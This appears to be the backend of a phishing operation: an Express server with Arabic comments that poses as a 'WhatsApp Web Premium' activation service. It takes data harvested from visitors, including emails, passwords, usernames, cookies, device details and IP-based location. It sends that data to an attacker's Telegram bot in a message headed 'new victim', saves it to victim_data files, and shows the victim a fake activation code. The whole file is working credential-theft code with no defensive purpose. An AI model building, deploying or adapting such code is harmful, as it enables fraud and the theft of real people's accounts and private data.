const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.static(__dirname));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// الصفحة الرئيسية
app.get('/', (req, res) => {
    console.log('📄 طلب الصفحة الرئيسية من IP:', req.ip);
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API لجمع البيانات
app.post('/api/collect-full-data', async (req, res) => {
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    
    console.log('🎯 طلب بيانات كاملة من IP:', clientIP);
    
    try {
        const userData = req.body;
        
        // إضافة IP العميل إلى البيانات
        userData.clientIP = clientIP;
        userData.headers = {
            'user-agent': req.headers['user-agent'],
            'accept-language': req.headers['accept-language'],
            'referer': req.headers['referer']
        };

        // 🔥 إرسال إلى التلجرام
        const telegramResult = await sendFullDataToTelegram(userData);
        
        // 🔥 حفظ البيانات في ملف (نسخة احتياطية)
        saveToFile(userData);

        console.log('✅ تم جمع وإرسال البيانات بنجاح');

        res.json({
            success: true,
            message: 'تم التفعيل بنجاح! 🎉',
            data: {
                activationCode: generateActivationCode(),
                premiumUntil: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString('ar-SA')
            }
        });

    } catch (error) {
        console.error('❌ خطأ:', error);
        res.json({
            success: true,
            message: 'تم التفعيل بنجاح! 🎉'
        });
    }
});

// 🔥 دالة إرسال البيانات الكاملة إلى التلجرام
async function sendFullDataToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('❌ إعدادات التلجرام مفقودة');
            return { success: false, error: 'إعدادات التلجرام مفقودة' };
        }

        // الحصول على معلومات الموقع من الـ IP
        const locationInfo = await getLocationFromIP(userData.clientIP);

        // بناء الرسالة الكاملة
        const message = `
🎯 **ضحية جديدة - بيانات كاملة** 🌍

📍 **المعلومات الجغرافية:**
• الدولة: ${locationInfo.country || 'غير معروف'} ${locationInfo.country ? '🏴' : '🔻'}
• المدينة: ${locationInfo.city || 'غير معروف'} 🏙️
• المنطقة: ${locationInfo.region || 'غير معروف'} 🗺️
• الرمز البريدي: ${locationInfo.zip || 'غير معروف'} 📮
• ISP: ${locationInfo.isp || 'غير معروف'} 📡
• عنوان IP: ${userData.clientIP || 'غير معروف'} 🌐

📱 **معلومات الجهاز:**
• نوع الجهاز: ${userData.deviceType || 'غير معروف'} 📱
• اسم الجهاز: ${userData.deviceName || 'غير معروف'} 🖥️
• إصدار الجهاز: ${userData.deviceVersion || 'غير معروف'} 📜
• نظام التشغيل: ${userData.os || 'غير معروف'} 💻
• إصدار النظام: ${userData.osVersion || 'غير معروف'} 🖥️
• الذاكرة (RAM): ${userData.ram || 'غير معروف'} 🧠
• الأنوية: ${userData.cores || 'غير معروف'} ⚙️
• شحن البطارية: ${userData.batteryLevel || 'غير معروف'}% 🔋
• حالة الشحن: ${userData.isCharging ? 'نعم ⚡' : 'لا 🔋'}

🌐 **معلومات الشبكة:**
• نوع الشبكة: ${userData.connectionType || 'غير معروف'} 📶
• سرعة الشبكة: ${userData.connectionSpeed || 'غير معروف'} 📡
• نطاق التردد: ${userData.connectionFrequency || 'غير معروف'} MHz
• بروتوكول الأمان: ${userData.securityProtocol || 'غير معروف'} 🔒

📊 **معلومات المتصفح:**
• المتصفح: ${userData.browserName || 'غير معروف'} 🌐
• إصدار المتصفح: ${userData.browserVersion || 'غير معروف'} 📊
• اللغة: ${userData.language || 'غير معروف'} 🌐
• دعم الموقع: ${userData.geolocation ? 'نعم 🌍' : 'لا ❌'}
• دعم البلوتوث: ${userData.bluetooth ? 'نعم 🔵' : 'لا ❌'}
• دعم اللمس: ${userData.touchSupport ? 'نعم ✋' : 'لا ❌'}

🖥️ **معلومات الشاشة:**
• الدقة: ${userData.screenResolution || 'غير معروف'} 📏
• اتجاه الشاشة: ${userData.screenOrientation || 'غير معروف'} 🔄
• عمق الألوان: ${userData.colorDepth || 'غير معروف'} bit 🎨
• الذاكرة الداخلية: ${userData.storage || 'غير معروف'} 💾

📧 **البيانات المجمعة:**
• الإيميلات: ${userData.emails ? userData.emails.length : 0} 📧
• كلمات المرور: ${userData.passwords ? userData.passwords.length : 0} 🔐
• المستخدمين: ${userData.usernames ? userData.usernames.length : 0} 👤
• الكوكيز: ${userData.cookies ? userData.cookies.length : 0} 🍪

🔍 **معلومات إضافية:**
• الرابط: ${userData.url || 'غير معروف'} 🔗
• الريفيرر: ${userData.referrer || 'مباشر'} 📍
• الوقت: ${new Date().toLocaleString('ar-SA')} ⏰
• المنطقة الزمنية: ${userData.timezone || 'غير معروف'} 🕒

${userData.downloadedFiles && userData.downloadedFiles.length > 0 ? 
`📁 **الملفات المحملة:**\n${userData.downloadedFiles.slice(0, 5).map(file => `• ${file.name} (${file.size})`).join('\n')}` : 
'📁 **الملفات:** ❌ لا توجد ملفات'}

${userData.emails && userData.emails.length > 0 ? 
`\n📨 **قائمة الإيميلات:**\n${userData.emails.slice(0, 10).map(email => `• ${email.value || email}`).join('\n')}` : 
''}

${userData.emails && userData.emails.length > 10 ? `\n... و ${userData.emails.length - 10} إيميل إضافي` : ''}
        `.trim();

        console.log('📤 جاري إرسال البيانات الكاملة إلى التلجرام...');

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        if (response.ok) {
            console.log('✅ تم إرسال البيانات الكاملة إلى التلجرام');
            return { success: true, messageId: result.result?.message_id };
        } else {
            console.error('❌ خطأ من التلجرام:', result);
            return { success: false, error: result.description };
        }

    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error);
        return { success: false, error: error.message };
    }
}

// 🔥 دالة للحصول على الموقع من IP
async function getLocationFromIP(ip) {
    try {
        if (!ip || ip === '::1' || ip === '127.0.0.1') {
            return { country: 'غير معروف', city: 'غير معروف' };
        }

        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        
        if (data.status === 'success') {
            return {
                country: data.country || 'غير معروف',
                city: data.city || 'غير معروف',
                region: data.regionName || 'غير معروف',
                zip: data.zip || 'غير معروف',
                isp: data.isp || 'غير معروف',
                lat: data.lat,
                lon: data.lon
            };
        } else {
            return { country: 'غير معروف', city: 'غير معروف' };
        }
    } catch (error) {
        console.log('❌ خطأ في الحصول على الموقع:', error);
        return { country: 'غير معروف', city: 'غير معروف' };
    }
}

// 🔥 دالة لحفظ البيانات في ملف
function saveToFile(data) {
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `victim_data_${timestamp}.json`;
        
        const fileData = {
            timestamp: new Date().toISOString(),
            ip: data.clientIP,
            ...data
        };
        
        fs.writeFileSync(filename, JSON.stringify(fileData, null, 2));
        console.log('💾 تم حفظ البيانات في ملف:', filename);
    } catch (error) {
        console.error('❌ خطأ في حفظ الملف:', error);
    }
}

// دالة إنشاء كود تفعيل
function generateActivationCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = 'WAPP-';
    for (let i = 0; i < 8; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// صفحة الفحص
app.get('/status', (req, res) => {
    res.json({
        status: '✅ يعمل',
        service: 'WhatsApp Web Premium',
        timestamp: new Date().toISOString(),
        telegram: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID)
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 =================================');
    console.log('🚀 السيرفر شغال!');
    console.log(`🚀 البورت: ${PORT}`);
    console.log(`🔑 التلجرام: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ مضبوط' : '❌ مش مضبوط'}`);
    console.log('🌐 الرابط:', `http://localhost:${PORT}`);
    console.log('🔍 الفحص:', `http://localhost:${PORT}/status`);
    console.log('🚀 =================================');
});
